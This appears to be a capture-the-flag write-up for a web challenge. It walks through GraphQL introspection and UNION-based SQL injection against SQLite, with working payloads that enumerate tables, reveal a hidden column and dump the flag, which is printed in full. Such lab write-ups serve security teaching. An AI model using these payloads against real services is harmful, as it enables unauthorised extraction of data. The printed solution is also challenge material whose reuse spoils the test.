[challenge-02-silent-oracle.md](https://github.com/user-attachments/files/28261100/challenge-02-silent-oracle.md)
# Challenge 02 — Silent Oracle

> **Category:** Web · **Points:** 100 · **Difficulty:** Medium

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Exploitation Chain](#exploitation-chain)
  - [Step 1 — Database Fingerprinting](#step-1--database-fingerprinting)
  - [Step 2 — Inspecting Table Structures](#step-2--inspecting-table-structures)
  - [Step 3 — Discovering Hidden Columns](#step-3--discovering-hidden-columns)
  - [Step 4 — Dumping the Flag](#step-4--dumping-the-flag)
- [Flag](#flag)
- [Takeaways](#takeaways)

---

## Overview

A quiet internal directory exposes a minimal public surface. The useful answers are hidden behind how the service thinks about people and roles.

| Field       | Detail                          |
|-------------|---------------------------------|
| Category    | Web                             |
| Points      | 100                             |
| Technique   | GraphQL Introspection + SQLi    |
| DBMS        | SQLite                          |
| Flag        | `0xV01D{ca45b212-1551-427d-90a6-98d88a4cd027}` |

---

## Reconnaissance

Upon accessing the application, the `/about` page yields nothing useful. The real attack surface is a **GraphQL endpoint** that accepts dynamic queries.

Schema introspection reveals a `Query` type with two resolvers:

```graphql
type Query {
  users(search: String): [User]
  user(id: Int): User
}
```

Running a wildcard search returns only users with IDs **2–4** — the record with `id: 1` is conspicuously absent, suggesting server-side filtering or a hidden privileged account.

```graphql
# Returns id: 2, 3, 4 — never id: 1
query {
  users(search: "%") {
    id
    username
    email
  }
}
```

> **Hypothesis:** The `search` parameter is interpolated directly into a SQL query without sanitisation → SQL Injection.

---

## Vulnerability Analysis

The `search` parameter is passed raw into a `LIKE` clause, e.g.:

```sql
SELECT id, username, email, role FROM users WHERE username LIKE '<input>'
```

Because the query selects a fixed number of columns, a `UNION`-based injection must match that column count. Testing confirms **4 columns**, allowing us to exfiltrate arbitrary data through the GraphQL response fields.

---

## Exploitation Chain

### Step 1 — Database Fingerprinting

Identify the DBMS and enumerate all tables by querying SQLite's internal catalogue:

```sql
' UNION SELECT 1, name, name, '' FROM sqlite_master WHERE type='table'--
```

**GraphQL payload:**

```graphql
query {
  users(search: "' UNION SELECT 1, name, name, '' FROM sqlite_master WHERE type='table'--") {
    id
    username
    email
  }
}
```

**Result:** Confirms **SQLite** and reveals tables including `users` and `audit_log`.

---

### Step 2 — Inspecting Table Structures

Retrieve the `CREATE TABLE` statement for `audit_log` to understand its schema:

```sql
' UNION SELECT 1, sql, '', '' FROM sqlite_master WHERE type='table' AND name='audit_log'--
```

This reveals how the application logs internal events, and confirms we have the correct column count for our `UNION` payloads.

---

### Step 3 — Discovering Hidden Columns

The GraphQL schema exposes only `id`, `username`, `email`, and `role` — but the underlying table may have more. Use SQLite's built-in `pragma_table_info` to list every column:

```sql
' UNION SELECT 1, name, name, type FROM pragma_table_info('users')--
```

**Result:**

| Column   | Type    |
|----------|---------|
| id       | INTEGER |
| username | TEXT    |
| email    | TEXT    |
| role     | TEXT    |
| **secret** | **TEXT** |

🔑 A hidden column named **`secret`** is not exposed by the GraphQL schema.

---

### Step 4 — Dumping the Flag

With the hidden column identified, extract its contents directly:

```sql
' UNION SELECT 1, secret, '', '' FROM users--
```

**GraphQL payload:**

```graphql
query {
  users(search: "' UNION SELECT 1, secret, '', '' FROM users--") {
    id
    username
    email
  }
}
```

**Response:**

```json
{
  "data": {
    "users": [
      { "username": "0xV01D{ca45b212-1551-427d-90a6-98d88a4cd027}" }
    ]
  }
}
```

---

## Flag

```
0xV01D{ca45b212-1551-427d-90a6-98d88a4cd027}
```

---

## Takeaways

| # | Lesson |
|---|--------|
| 1 | **GraphQL ≠ safe** — introspection leaks schema, and resolvers may still pass input to raw SQL |
| 2 | **Missing records = red flag** — a gap in sequential IDs often signals filtered/privileged data |
| 3 | **`pragma_table_info`** is invaluable for discovering columns hidden from the application layer |
| 4 | **`sqlite_master`** doubles as a fingerprinting vector and schema enumeration source |
| 5 | Always parameterise queries — never interpolate user input into SQL strings |

---

*Writeup by [your-handle] · CTF: [competition-name] · Date: 2026-05-26*
